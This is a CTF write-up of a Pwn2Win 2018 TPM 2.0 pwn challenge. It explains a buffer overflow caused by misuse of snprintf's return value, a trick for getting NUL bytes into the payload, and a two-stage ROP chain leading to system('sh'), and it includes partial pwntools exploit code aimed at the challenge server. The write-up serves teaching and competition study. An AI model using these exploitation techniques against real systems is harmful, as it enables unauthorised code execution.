At last year's Pwn2Win, we ([spritzers](http://spritz.math.unipd.it/spritzers.html)) were the only team to solve the [SGX challenge](https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/pwn2win-2017/reversing/intel-sgx-474).
We played again this year, getting 6th place.
There was another trusted computing challenge (pwn), on TPM 2.0 this time: we kept up the tradition and were the only team to solve it.
So here's a writeup, enjoy :)

> Wilson created this application in a trusted platform. The thing is though, he encrypted the flag but lost the private key :(
> 
> Server: nc 10.133.70.5 4500

This was an isolated challenge: you had to solve six challenges to get VPN access to the box.
You can grab the challenge files [here](/assets/ctf/pwn2win18/tpm20_828976b44e5a91dd81f1d5da6c46279f4c890dead9b537cff9af07f3930ebf24.tar.gz).

### Overview

Checksec shows partial RELRO, stack canaries, NX, no PIE.
When connecting to the server, we are greeted with a menu:

```
Welcome to my trusted platform. Tell me what do you want:

[1] List PCRs
[2] Get encrypted flag
[3] Get public portion
[4] Get private portion
[5] Bye
>
```

Option 1 allows to read TPM PCRs (more on this in a bit).
Option 2 shows a hex dump of `/home/wilson/flag.txt.enc` (encrypted flag).
Option 3 shows a hex dump of `/home/wilson/rsa_pubkey` (public key).
Option 4 tries to show a hex dump of `/home/wilson/rsa_privkey`, but the file doesn't exist.
Option 5 exits.

Let's have a look at the public key:

This is a TPM 2.0 2048-bit RSA public key (you might want to check [tss2_tpm2_types.h](https://github.com/tpm2-software/tpm2-tss/blob/master/include/tss2/tss2_tpm2_types.h)).
The TPM can store crypto keys and perform encryption/decryption with them.
Since the public key is in TPM format, my guess was that the TPM held the private key for decrypting the flag.

Let's get back to option 1.
It asks for a comma-separated list of Platform Configuration Register (PCR) numbers, from 0 to 23, and outputs the requested PCRs.
Essentially, the PCRs are registers that can only be _extended_ with a measurement $$m$$, i.e., updated as $$R \gets H(R \| m)$$, where $$R$$ is the PCR content and $$H$$ is a hash function.
For example, this is used to ensure integrity of a boot chain: each stage extends PCR 0 with the next stage's hash, and since PCRs cannot be directly set but only extended, tampering with the chain will inevitably result in a different final hash.

However, being able to read PCRs doesn't really help us with recovering the RSA key: they're just hash chains of measurements.
So I started looking for other vulnerabilities.

### The bug

This is the decompiled (and cleaned up) code for option 1:

```c
// @ 0x400bf0
void list_pcrs(ESYS_CONTEXT *esys_ctx)
{
  uint32_t pcrUpdateCounter; // [rsp+1Ch] [rbp-A04h]
  int size; // [rsp+20h] [rbp-A00h]
  int i; // [rsp+24h] [rbp-9FCh]
  int pcr; // [rsp+28h] [rbp-9F8h]
  TPML_PCR_SELECTION *pcrSelectionOut; // [rsp+30h] [rbp-9F0h]
  TPML_DIGEST *pcrValues; // [rsp+38h] [rbp-9E8h]
  char *tok; // [rsp+40h] [rbp-9E0h]
  ssize_t num; // [rsp+48h] [rbp-9D8h]
  TPML_PCR_SELECTION pcrSelectionIn; // [rsp+50h] [rbp-9D0h]
  char hex[41]; // [rsp+E0h] [rbp-940h]
  char input[256]; // [rsp+110h] [rbp-910h]
  char buf[2048]; // [rsp+210h] [rbp-810h]

  memset(buf, 0, sizeof(buf));
  size = 0;

  puts("Which PCRs do you wanna read?");
  num = read(0, input, sizeof(input));
  input[num - 1] = 0;

  memset(&pcrSelectionIn, 0, sizeof(pcrSelectionIn));
  pcrSelectionIn.count = 2;
  pcrSelectionIn.pcrSelections[0].hash = TPM2_ALG_SHA1;
  pcrSelectionIn.pcrSelections[0].sizeofSelect = 3;
  pcrSelectionIn.pcrSelections[1].hash = TPM2_ALG_SHA256;
  pcrSelectionIn.pcrSelections[1].sizeofSelect = 3;

  for (tok = strtok(input, ","); tok; tok = strtok(NULL, ",")) {
    pcr = atoi(tok);

    if (pcr >= 0 && pcr <= 23) {
      pcrSelectionIn.pcrSelections[0].pcrSelect[pcr / 8] |= 1 << (pcr % 8);
      Esys_PCR_Read(esys_ctx, ESYS_TR_NONE, ESYS_TR_NONE, ESYS_TR_NONE,
        &pcrSelectionIn, &pcrUpdateCounter, &pcrSelectionOut, &pcrValues);

      hexdump(pcrValues->digests[0].buffer, 20, hex, 41);
      size += snprintf(&buf[size], sizeof(buf) - size,
        "PCR %s: %s\n", tok, hex);

      pcrSelectionIn.pcrSelections[0].pcrSelect[0] = 0;
      pcrSelectionIn.pcrSelections[0].pcrSelect[1] = 0;
      pcrSelectionIn.pcrSelections[0].pcrSelect[2] = 0;
    }
  }

  for (i = 0; i < size; i++) {
    if (buf[i] == '%')
      buf[i] = 0;
  }
  printf(buf);
}
```

You can find the library that's being used at [tpm2-tss](https://github.com/tpm2-software/tpm2-tss).

The code reads up to 255 (+ NUL) bytes from the user.
It splits the input on commas and, for each token, it converts the token to a number, and if it's a valid PCR number (0 to 23) it reads the SHA1 hash of that PCR.
Then, it appends a line of output to `buf` using `snprintf`.
The line includes the token itself (not the number as `%d`, this is important) and the PCR hash (40 hex digits).
At the end, there's something strange: all `%` characters in `buf` are replaced with NULs, and finally `buf` is printed by passing it directly to `printf`.

Since the output includes the token itself, and `atoi` will happily return zero (valid PCR number) when called on something that is not a number, the last `printf` would cause a format string vulnerability if it wasn't for that loop.
We might be hitting on something, let's keep digging.

The programmer is trying to avoid overflowing `buf` by using `size += snprintf(&buf[size], sizeof(buf) - size, ...)`.
This relies on the assumption that `snprintf` returns the number of bytes actually written to the buffer.
However, `snprintf` returns the number of bytes that _would have been written to the buffer if there was enough space_.
This mistake actually happens in the real world (author was inspired by CVE-2018-1000140).
Imagine we do $$N$$ reads, such that the output for $$N-2$$ reads fits in the buffer, but the output for $$N-1$$ reads doesn't.
The read $$N-1$$ will be truncated, but `size` will be updated as if it was written in full.
Now `size` is larger than `sizeof(buf)`.
Since `snprintf` takes its second argument as a `size_t` (unsigned), `sizeof(buf) - size` becomes a very large number, and read $$N$$ will overflow `buf`.

### Popping a shell

At this point, we have a vulnerability that can lead to remote code execution.
We still don't have a plan to decrypt the flag, but let's get a shell and see what we can find.

We want to do ROP through the `snprintf` vulnerability.
A 64-bit ROP chain is bound to have NUL bytes, which would terminate the input.
However, the sanitization loop before `printf` helps us: we can replace all NUL bytes with `%`, and the loop will transform them back into NULs.

There's a stack canary at `buf+0x808`, which we want to keep intact, and the return address is at `buf+0x818`.
The buffer is 2048 bytes.
Each PCR produces 47 bytes of output plus the length of the number token.
Note that `strtok` ignores empty tokens.
After fiddling for a bit, I got the following setup:

- 42 reads for PCR `0`: 48 bytes of output each, for a total of 2016 bytes (still within the buffer).
- 1 read for PCR `AAAA`: `atoi("AAAA") == 0`, 51 bytes of output, `size` becomes 0x813 (past the canary, 5 bytes from return address).
- 1 read for PCR `A<chain>`: `atoi("A...") == 0`, the `PCR A` prefix of the output is exactly 5 bytes, so `<chain>` will overwrite the return address.

I used a pretty standard two-stage ROP.
The first stage uses the `puts` PLT to leak a libc address from the GOT, then returns to `main` again.
Now that the libc base is known, I perform the overflow again for a second stage which calls `system("sh")`.

### Decrypting the flag

Now that I had a shell, I noticed a couple of things:

- The [TPM 2.0 tools](https://github.com/tpm2-software/tpm2-tools) were installed.
- There was a file named `context` in `/home/wilson/`.

The TPM 2.0 tools can be used to perform various operations, such as creating keys and encrypting/decrypting data.
When creating a key, the tools produce a context file which can then be used to encrypt/decrypt with that key.
Most likely, that `context` in the home directory will allow us to decrypt the flag.
A quick look at this [cheatsheet](https://github.com/tpm2-software/tpm2-tools/wiki/How-to-use-tpm2-tools), and we're done:

```
$ tpm2_rsadecrypt -c context -I flag.txt.enc -o /tmp/flag.txt
$ cat /tmp/flag.txt
CTF-BR{TPM2.0_tools_4_easy_decryption_}
```

### Notes on running the binary

You probably want to run the binary for debugging.
It needs the [TPM 2.0 libraries](https://github.com/tpm2-software/tpm2-tss) to work.
In my case, they were available in the Fedora 29 repos (I'm still on fc28, but I just copied the files from the fc29 RPM).
However, I did not have TPM 2.0 hardware.
One solution is to use an emulator, but I went with a more quick & dirty option.
The program does not actually need a TPM to be exploitable: listing PCRs is useless to us.
I patched the call to `Esys_Initialize` in `main` with `xor eax, eax`, so the program thinks it succeeded.
Then, I replaced the call to `Esys_PCR_Read` in `list_pcrs` with `mov [rbp-0x9e8], 0x602100`, which makes `pcrValues` point to memory filled with zeroes.
Any PCR will now read as zero, but there are no calls to TPM functions and it is equivalent as far as exploitation is concerned.

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *

context(os='linux', arch='x86_64')

tpm20 = ELF('./tpm20')
libc = ELF('./libc.so.6')

#p = process(argv=['/home/andrea/ld-2.23.so', '--library-path', './lib', './tpm20_patch'])
p = remote('10.133.70.5', 4500)

def pcrs_ret(data):
    assert ',' not in data
    data_sane = data.replace('\x00', '%')

    # Each PCR outputs 47 + len(tok) bytes
    # Buffer size = 2048
    # Canary @ buffer+0x808
    # Retaddr @ buffer+0x818
    # '0' 42 times -> size = 0x7e0 < 2048
    # 'A'*4 (= 0) -> size = 0x813 > 2048
    # Next print is "PCR <num>: ..."
    # <num> is at buffer+0x817 -> retaddr-1
    # We prefix with A in order to:
    #   - make atoi return 0 (valid PCR)
    #   - get to retaddr
    return ['0']*42 + ['A'*4, 'A' + data_sane]

def menu(choice):
    p.recvuntil('> ')
    p.sendline(str(choice))

def list_pcrs(pcrs, final=False):
    pcrs_str = ','.join(pcrs)
    assert len(pcrs_str) <= 255

    menu(1)
    p.recvuntil('Which PCRs do you wanna read?\n')
    p.send(pcrs_str.ljust(256, '\x00'))

    if not final:
        output = p.recvuntil('\nWelcome')[:-len('\nWelcome')]
        return output

def do_rop(chain, *args, **kwargs):
    return list_pcrs(pcrs_ret(chain), *args, **kwargs)
